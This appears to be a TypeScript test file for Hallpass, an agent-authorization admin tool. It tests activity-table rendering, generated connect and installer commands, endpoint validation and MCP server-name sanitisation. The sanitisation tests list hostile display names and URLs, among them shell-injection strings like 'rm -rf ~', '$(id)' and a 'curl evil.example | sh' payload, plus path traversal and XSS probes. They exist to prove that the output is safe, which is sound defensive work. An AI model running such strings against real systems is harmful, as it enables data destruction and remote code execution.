import assert from "node:assert/strict";
import test from "node:test";
import { renderToStaticMarkup } from "react-dom/server";
import { ActivityTable } from "../src/features/activity/ActivityTable.tsx";
import { buildRequests } from "../src/lib/requests.ts";
import { SERVER_NAME_PATTERN, acceptedEndpoint, claudeToolPrefix, clientOf, connectCommands, defaultServerName, downloadsBase, installerCommand, loadAgentClients, manualClientConfig, serverNameFor } from "../src/features/agents/clients.ts";

test("activity rows name the agent and action and show result and source, never raw IDs", () => {
  const requests = buildRequests(
    [
      { requestId: "r-1", decision: "deny", title: "", reason: "NoMatchingAuthority", authorizationSource: "AGENT_CALL", tool: "slack_search_messages", principalId: "agent-1", checkedAt: "2026-09-24T12:00:00Z" },
      { requestId: "r-2", decision: "allow", title: "", reason: "authorized", authorizationSource: "HUMAN_PREVIEW", tool: "unknown_demo_tool", principalId: "gone", checkedAt: "2026-09-24T11:00:00Z" }
    ],
    []
  );
  const html = renderToStaticMarkup(
    <ActivityTable
      caption="Activity"
      requests={requests}
      agents={[{ id: "agent-1", name: "Local Codex" }]}
      tools={[{ name: "slack_search_messages", label: "Search Slack messages", capability: "Slack.Message.Read", trusted: true }]}
      onOpen={() => undefined}
    />
  );
  assert.match(html, /Local Codex/);
  assert.match(html, /Read Slack messages/);
  assert.match(html, /Unmapped tool/);
  assert.match(html, /pill-danger[^>]*>Blocked/);
  assert.match(html, /pill-healthy[^>]*>Allowed/);
  assert.match(html, />Agent</);
  assert.match(html, />Test</);
  assert.match(html, /Unknown agent/);
  assert.doesNotMatch(html, /r-1|r-2/);
});

const SANDBOX_API = "https://hallpass-sandbox.example-tailnet.ts.net:8443";
const AGENT = "11111111-2222-4333-8444-555555555555";
const NAME = "hallpass-research-agent";

test("connect commands carry the agent, client, and URL, and --rotate or --replace only when asked", () => {
  const commands = connectCommands(AGENT, "claude", SANDBOX_API, NAME);
  const cli = '"$HOME/.local/share/hallpass/bridge/bin/hallpass"';
  assert.equal(commands.connect, `${cli} connect claude --agent ${AGENT} --url ${SANDBOX_API} --name ${NAME}`);
  assert.equal(commands.rotate, `${commands.connect} --rotate`);
  assert.equal(commands.replace, `${commands.connect} --replace`);
  assert.equal(commands.doctor, `${cli} doctor --client claude --agent ${AGENT} --name ${NAME}`);
  assert.doesNotMatch(commands.connect, /--rotate|--replace/);
  assert.doesNotMatch(commands.rotate, /--replace/);
});

test("the installer one-liner installs from this instance and points the bridge at the agent API", () => {
  const base = "https://admin.example.com/downloads";
  assert.equal(
    installerCommand(base, AGENT, "codex", SANDBOX_API, NAME),
    `curl -fsSL ${base}/install.sh | sh -s -- --from ${base} --url ${SANDBOX_API} --agent ${AGENT} --client codex --name ${NAME}`
  );
});

test("no generated command can contain key material", () => {
  const key = /hallpass_[A-Za-z0-9_-]{16,}|credential|secret|token|bearer/i;
  for (const client of ["codex", "claude", "antigravity"] as const) {
    const commands = connectCommands(AGENT, client, SANDBOX_API, NAME);
    for (const command of [...Object.values(commands), installerCommand("https://admin.example.com/downloads", AGENT, client, SANDBOX_API, NAME)]) {
      assert.doesNotMatch(command, key);
      assert.doesNotMatch(command, /--(key|credential|token|secret)\b/);
    }
  }
});

test("the downloads location follows the admin origin and never uses localhost", () => {
  assert.equal(downloadsBase("https://admin.example.com"), "https://admin.example.com/downloads");
  assert.equal(downloadsBase("https://hallpass-sandbox.example-tailnet.ts.net"), "https://hallpass-sandbox.example-tailnet.ts.net/downloads");
  assert.equal(downloadsBase("http://localhost:3000"), "http://127.0.0.1:3000/downloads");
  assert.equal(downloadsBase("http://127.0.0.1:3100"), "http://127.0.0.1:3100/downloads");
  assert.equal(downloadsBase("http://192.168.1.20:3000"), undefined);
  assert.equal(downloadsBase("http://admin.example.com"), undefined);
  assert.equal(downloadsBase("not a url"), undefined);
});

test("the endpoint rule matches the bridge: https to one host, or numeric loopback over http", () => {
  assert.equal(acceptedEndpoint("https://agents.example.com"), "https://agents.example.com");
  assert.equal(acceptedEndpoint("https://agents.example.com:8443/"), "https://agents.example.com:8443");
  assert.equal(acceptedEndpoint("http://127.0.0.1:8081"), "http://127.0.0.1:8081");
  assert.equal(acceptedEndpoint("http://[::1]:8081"), "http://[::1]:8081");
  for (const refused of [
    "", "agents.example.com", "http://localhost:8081", "http://agents.example.com", "http://10.0.0.5:8081", "ftp://agents.example.com",
    "https://agents.example.com/path", "https://agents.example.com?x=1", "https://agents.example.com/#x", "https://user@agents.example.com",
    "https://localhost", "https://agents.example.com; rm -rf ~", "https://agents.example.com/$(id)", "https://agents.example.com:99999"
  ]) assert.equal(acceptedEndpoint(refused), undefined, refused);
});

test("a remembered client wins over the name guess, which falls back to other", () => {
  assert.equal(clientOf({ id: "1", name: "My Codex" }, {}), "codex");
  assert.equal(clientOf({ id: "1", name: "My Codex" }, { "1": "claude" }), "claude");
  assert.equal(clientOf({ id: "2", name: "Research" }, {}), "other");
  assert.deepEqual(loadAgentClients(), {});
});

test("manual configs reference the key file and the agent API address, never a key value", () => {
  for (const client of ["codex", "claude", "antigravity", "other"] as const) {
    const config = manualClientConfig(client, "/home/me/hallpass/", "/home/me/.config/hallpass/credentials/agent", SANDBOX_API, NAME);
    assert.match(config, /\/home\/me\/hallpass\/bridge\/bin\/hallpass-bridge/);
    assert.match(config, /HALLPASS_AGENT_CREDENTIAL_FILE/);
    assert.ok(config.includes(SANDBOX_API), config);
    assert.doesNotMatch(config, /127\.0\.0\.1|localhost/);
  }
  const local = manualClientConfig("codex", "/x", "/y", "http://127.0.0.1:8081", NAME);
  assert.match(local, /HALLPASS_AGENT_API_URL = "http:\/\/127\.0\.0\.1:8081"/);
  assert.match(manualClientConfig("codex", "relative", "", SANDBOX_API, NAME), /<ABSOLUTE_WSL_CHECKOUT>[\s\S]*<ABSOLUTE_CREDENTIAL_FILE_PATH>/);
});

test("manual configs register the per-agent name, not a fixed one", () => {
  const args = ["/home/me/hallpass", "/home/me/key", SANDBOX_API, NAME] as const;
  assert.match(manualClientConfig("codex", ...args), new RegExp(`^\\[mcp_servers\\.${NAME}\\]`));
  for (const client of ["claude", "antigravity", "other"] as const) {
    assert.deepEqual(Object.keys(JSON.parse(manualClientConfig(client, ...args)).mcpServers), [NAME]);
  }
  assert.doesNotMatch(manualClientConfig("codex", ...args) + manualClientConfig("claude", ...args), /hallpass-slack/);
});

test("the server name comes from the display name: lowercase, runs of other characters become one hyphen, prefixed", () => {
  const derive = (name: string, id = AGENT) => serverNameFor({ id, name });
  assert.equal(derive("Research Agent"), "hallpass-research-agent");
  assert.equal(derive("Codex"), "hallpass-codex");
  assert.equal(derive("  Local   Codex -- v2!  "), "hallpass-local-codex-v2");
  assert.equal(derive("R&D / Ops (prod)"), "hallpass-r-d-ops-prod");
  assert.equal(derive("already-hyphenated"), "hallpass-already-hyphenated");
  assert.equal(derive("A"), "hallpass-a");
});

test("the server name is cut to 24 characters and never ends in a hyphen", () => {
  assert.equal(derive40("a".repeat(60)), "hallpass-" + "a".repeat(24));
  // The cut lands on a hyphen: it must be trimmed so the rule (no trailing hyphen) still holds.
  const cut = "a".repeat(23) + " b";
  assert.equal(derive40(cut), "hallpass-" + "a".repeat(23));
  assert.match(derive40("x ".repeat(40)), SERVER_NAME_PATTERN);
  function derive40(name: string) { return serverNameFor({ id: AGENT, name }); }
});

test("the longest derived name keeps the Claude Code tool name within 64 characters", () => {
  const longest = serverNameFor({ id: AGENT, name: "a".repeat(80) });
  assert.ok((claudeToolPrefix(longest) + "slack_search_messages").length <= 64);
});

test("an empty slug falls back to hallpass- and the first 8 hex characters of the agent ID", () => {
  for (const name of ["", "   ", "!!!", "---", "\u00e9\u00e8", "\u65e5\u672c\u8a9e", "\u{1F600}"]) {
    assert.equal(serverNameFor({ id: AGENT, name }), "hallpass-11111111", JSON.stringify(name));
  }
  assert.equal(defaultServerName("A9A8E0B0-4f8f-4c58-a65f-0f1c4f329abc"), "hallpass-a9a8e0b0");
  assert.equal(serverNameFor({ id: "A9A8E0B0-4f8f-4c58-a65f-0f1c4f329abc", name: "" }), "hallpass-a9a8e0b0");
});

test("hostile display names give a name that passes the CLI rule and is safe in a shell", () => {
  const hostile = [
    "a; rm -rf ~", "$(id)", "`id`", "${HOME}", "x' && curl evil.example | sh #", 'q"uote"', "back\\slash", "new\nline", "tab\tname",
    "a|b&c>d<e", "--flag", "hallpass-x", "../../etc/passwd", "name\u0000nul", "\u202eevil", "caf\u00e9 \u0430dmin", "\u212a\u0130 Kelvin", "\ud83d\ude00 emoji",
    "A".repeat(500), "-".repeat(50) + "x", "%s%n", "{{7*7}}", "<script>alert(1)</script>", "x".repeat(39) + "\u00e9" + "y"
  ];
  for (const name of hostile) {
    const derived = serverNameFor({ id: AGENT, name });
    assert.match(derived, SERVER_NAME_PATTERN, JSON.stringify(name));
    assert.match(derived, /^[a-z0-9-]+$/, JSON.stringify(name));
    for (const client of ["codex", "claude", "antigravity"] as const) {
      const rendered = [
        ...Object.values(connectCommands(AGENT, client, SANDBOX_API, derived)),
        installerCommand("https://admin.example.com/downloads", AGENT, client, SANDBOX_API, derived)
      ];
      for (const command of rendered) {
        assert.match(command, new RegExp(`--name ${derived}(?: |$)`), command);
        assert.doesNotMatch(command, /[;`'<>\n]|\$\(|\$\{/, command);
      }
    }
  }
});

test("random display names always derive a valid name (property check with a fixed seed)", () => {
  let seed = 20260930;
  const next = () => (seed = (seed * 1664525 + 1013904223) >>> 0);
  const alphabet = "abcXYZ019 -_.;$`'\"()&|<>/\\\n\t\u00e9\u0430\u65e5\u{1F600}\u212a";
  const characters = Array.from(alphabet);
  for (let round = 0; round < 500; round += 1) {
    const length = next() % 90;
    const name = Array.from({ length }, () => characters[next() % characters.length]).join("");
    assert.match(serverNameFor({ id: AGENT, name }), SERVER_NAME_PATTERN, JSON.stringify(name));
  }
});

test("the commands refuse a name that does not pass the rule instead of rendering it", () => {
  for (const bad of ["", "hallpass-", "hallpass-x;id", "hallpass-$(id)", "hallpass-A", "other", "hallpass-" + "a".repeat(25), "hallpass-a\n", "hallpass-\u00e9"]) {
    assert.throws(() => connectCommands(AGENT, "codex", SANDBOX_API, bad), /invalid MCP server name/, JSON.stringify(bad));
    assert.throws(() => installerCommand("https://admin.example.com/downloads", AGENT, "codex", SANDBOX_API, bad), /invalid MCP server name/);
    assert.throws(() => manualClientConfig("codex", "/x", "/y", SANDBOX_API, bad), /invalid MCP server name/);
  }
});

test("Claude Code tools are prefixed with the server name", () => {
  assert.equal(claudeToolPrefix("hallpass-research-agent"), "mcp__hallpass-research-agent__");
});
